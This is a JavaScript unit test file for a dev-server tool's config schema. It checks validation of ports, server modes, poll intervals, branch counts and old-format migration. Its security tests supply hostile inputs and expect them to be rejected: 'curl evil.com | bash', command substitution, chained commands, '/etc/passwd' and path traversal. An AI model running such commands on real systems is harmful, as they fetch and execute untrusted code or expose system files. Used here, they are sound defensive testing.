/**
 * Tests for config schema module
 */

const { describe, it } = require('node:test');
const assert = require('node:assert');
const {
  SERVER_MODES,
  DEFAULTS,
  LIMITS,
  getDefaultConfig,
  validatePort,
  validateServerMode,
  validatePollInterval,
  validateVisibleBranches,
  validateConfig,
  migrateConfig,
} = require('../../../src/config/schema');
const { ConfigError, ValidationError } = require('../../../src/utils/errors');

describe('constants', () => {
  it('should have valid server modes', () => {
    assert.deepStrictEqual(SERVER_MODES, ['static', 'command', 'none']);
  });

  it('should have sensible defaults', () => {
    assert.strictEqual(DEFAULTS.server.mode, 'static');
    assert.strictEqual(DEFAULTS.server.port, 3000);
    assert.strictEqual(DEFAULTS.gitPollInterval, 5000);
    assert.strictEqual(DEFAULTS.visibleBranches, 7);
  });

  it('should have valid limits', () => {
    assert.strictEqual(LIMITS.port.min, 1);
    assert.strictEqual(LIMITS.port.max, 65535);
    assert.ok(LIMITS.gitPollInterval.min > 0);
    assert.ok(LIMITS.visibleBranches.min >= 1);
  });
});

describe('getDefaultConfig', () => {
  it('should return complete config object', () => {
    const config = getDefaultConfig();

    assert.ok(config.server);
    assert.strictEqual(config.server.mode, 'static');
    assert.strictEqual(config.server.port, 3000);
    assert.strictEqual(config.server.staticDir, 'public');
    assert.strictEqual(config.server.command, '');
    assert.strictEqual(config.server.restartOnSwitch, true);

    assert.strictEqual(config.remoteName, 'origin');
    assert.strictEqual(config.autoPull, true);
    assert.strictEqual(config.gitPollInterval, 5000);
    assert.strictEqual(config.soundEnabled, true);
    assert.strictEqual(config.visibleBranches, 7);
  });

  it('should return new object each time', () => {
    const config1 = getDefaultConfig();
    const config2 = getDefaultConfig();

    assert.notStrictEqual(config1, config2);
    assert.notStrictEqual(config1.server, config2.server);
  });
});

describe('validatePort', () => {
  it('should accept valid ports', () => {
    assert.strictEqual(validatePort(80), 80);
    assert.strictEqual(validatePort(3000), 3000);
    assert.strictEqual(validatePort(8080), 8080);
    assert.strictEqual(validatePort(65535), 65535);
    assert.strictEqual(validatePort('3000'), 3000);
  });

  it('should reject invalid ports', () => {
    assert.throws(() => validatePort(0), ValidationError);
    assert.throws(() => validatePort(-1), ValidationError);
    assert.throws(() => validatePort(65536), ValidationError);
    assert.throws(() => validatePort('abc'), ValidationError);
    assert.throws(() => validatePort(3.14), ValidationError);
  });
});

describe('validateServerMode', () => {
  it('should accept valid modes', () => {
    assert.strictEqual(validateServerMode('static'), 'static');
    assert.strictEqual(validateServerMode('command'), 'command');
    assert.strictEqual(validateServerMode('none'), 'none');
  });

  it('should reject invalid modes', () => {
    assert.throws(() => validateServerMode('invalid'), ConfigError);
    assert.throws(() => validateServerMode(''), ConfigError);
    assert.throws(() => validateServerMode('Static'), ConfigError); // Case sensitive
  });
});

describe('validatePollInterval', () => {
  it('should accept valid intervals', () => {
    assert.strictEqual(validatePollInterval(1000), 1000);
    assert.strictEqual(validatePollInterval(5000), 5000);
    assert.strictEqual(validatePollInterval('10000'), 10000);
  });

  it('should reject invalid intervals', () => {
    assert.throws(() => validatePollInterval(500), ConfigError); // Too low
    assert.throws(() => validatePollInterval(400000), ConfigError); // Too high
    assert.throws(() => validatePollInterval('abc'), ConfigError);
  });
});

describe('validateVisibleBranches', () => {
  it('should accept valid counts', () => {
    assert.strictEqual(validateVisibleBranches(1), 1);
    assert.strictEqual(validateVisibleBranches(7), 7);
    assert.strictEqual(validateVisibleBranches(50), 50);
    assert.strictEqual(validateVisibleBranches('10'), 10);
  });

  it('should reject invalid counts', () => {
    assert.throws(() => validateVisibleBranches(0), ConfigError);
    assert.throws(() => validateVisibleBranches(-1), ConfigError);
    assert.throws(() => validateVisibleBranches(51), ConfigError);
    assert.throws(() => validateVisibleBranches('abc'), ConfigError);
  });
});

describe('validateConfig', () => {
  it('should validate complete valid config', () => {
    const config = {
      server: {
        mode: 'command',
        port: 8080,
        staticDir: 'dist',
        command: 'npm run dev',
        restartOnSwitch: false,
      },
      remoteName: 'upstream',
      autoPull: false,
      gitPollInterval: 10000,
      soundEnabled: false,
      visibleBranches: 10,
    };

    const result = validateConfig(config);

    assert.strictEqual(result.server.mode, 'command');
    assert.strictEqual(result.server.port, 8080);
    assert.strictEqual(result.remoteName, 'upstream');
    assert.strictEqual(result.autoPull, false);
  });

  it('should fill missing values with defaults', () => {
    const config = {
      server: {
        mode: 'none',
      },
    };

    const result = validateConfig(config);

    assert.strictEqual(result.server.mode, 'none');
    assert.strictEqual(result.server.port, DEFAULTS.server.port);
    assert.strictEqual(result.remoteName, DEFAULTS.remoteName);
  });

  it('should reject null or non-object config', () => {
    assert.throws(() => validateConfig(null), ConfigError);
    assert.throws(() => validateConfig('string'), ConfigError);
    assert.throws(() => validateConfig(123), ConfigError);
  });

  it('should reject invalid nested values', () => {
    assert.throws(
      () => validateConfig({ server: { mode: 'invalid' } }),
      ConfigError
    );
    assert.throws(
      () => validateConfig({ server: { port: -1 } }),
      ValidationError
    );
  });

  it('should reject absolute staticDir paths', () => {
    assert.throws(
      () => validateConfig({ server: { staticDir: '/etc/passwd' } }),
      ConfigError
    );
  });

  it('should reject staticDir with path traversal', () => {
    assert.throws(
      () => validateConfig({ server: { staticDir: '../../../etc' } }),
      ConfigError
    );
  });

  it('should accept valid relative staticDir', () => {
    const result = validateConfig({ server: { staticDir: 'public' } });
    assert.strictEqual(result.server.staticDir, 'public');
  });

  it('should reject server.command with shell injection characters', () => {
    assert.throws(
      () => validateConfig({ server: { command: 'curl evil.com | bash' } }),
      ConfigError
    );
    assert.throws(
      () => validateConfig({ server: { command: 'echo $(whoami)' } }),
      ConfigError
    );
    assert.throws(
      () => validateConfig({ server: { command: 'cmd1; cmd2' } }),
      ConfigError
    );
    assert.throws(
      () => validateConfig({ server: { command: 'cmd1 & cmd2' } }),
      ConfigError
    );
  });

  it('should accept safe server.command values', () => {
    const result1 = validateConfig({ server: { command: 'npm run dev' } });
    assert.strictEqual(result1.server.command, 'npm run dev');

    const result2 = validateConfig({ server: { command: 'next dev --port 3000' } });
    assert.strictEqual(result2.server.command, 'next dev --port 3000');

    const result3 = validateConfig({ server: { command: '' } });
    assert.strictEqual(result3.server.command, '');
  });
});

describe('migrateConfig', () => {
  it('should pass through new format configs', () => {
    const config = {
      server: {
        mode: 'command',
        port: 8080,
      },
      remoteName: 'origin',
      autoPull: true,
      gitPollInterval: 5000,
      soundEnabled: true,
      visibleBranches: 7,
    };

    const result = migrateConfig(config);

    assert.strictEqual(result.server.mode, 'command');
    assert.strictEqual(result.server.port, 8080);
  });

  it('should migrate old format noServer', () => {
    const oldConfig = {
      noServer: true,
      port: 8080,
    };

    const result = migrateConfig(oldConfig);

    assert.strictEqual(result.server.mode, 'none');
    assert.strictEqual(result.server.port, 8080);
  });

  it('should migrate old format with all fields', () => {
    const oldConfig = {
      port: 4000,
      staticDir: 'build',
      gitPollInterval: 10000,
      soundEnabled: false,
      visibleBranches: 5,
    };

    const result = migrateConfig(oldConfig);

    assert.strictEqual(result.server.mode, 'static'); // Default
    assert.strictEqual(result.server.port, 4000);
    assert.strictEqual(result.server.staticDir, 'build');
    assert.strictEqual(result.gitPollInterval, 10000);
    assert.strictEqual(result.soundEnabled, false);
    assert.strictEqual(result.visibleBranches, 5);
  });

  it('should use defaults for missing old format fields', () => {
    const oldConfig = {
      port: 3000,
    };

    const result = migrateConfig(oldConfig);

    assert.strictEqual(result.server.mode, 'static');
    assert.strictEqual(result.remoteName, 'origin');
    assert.strictEqual(result.autoPull, true);
  });
});
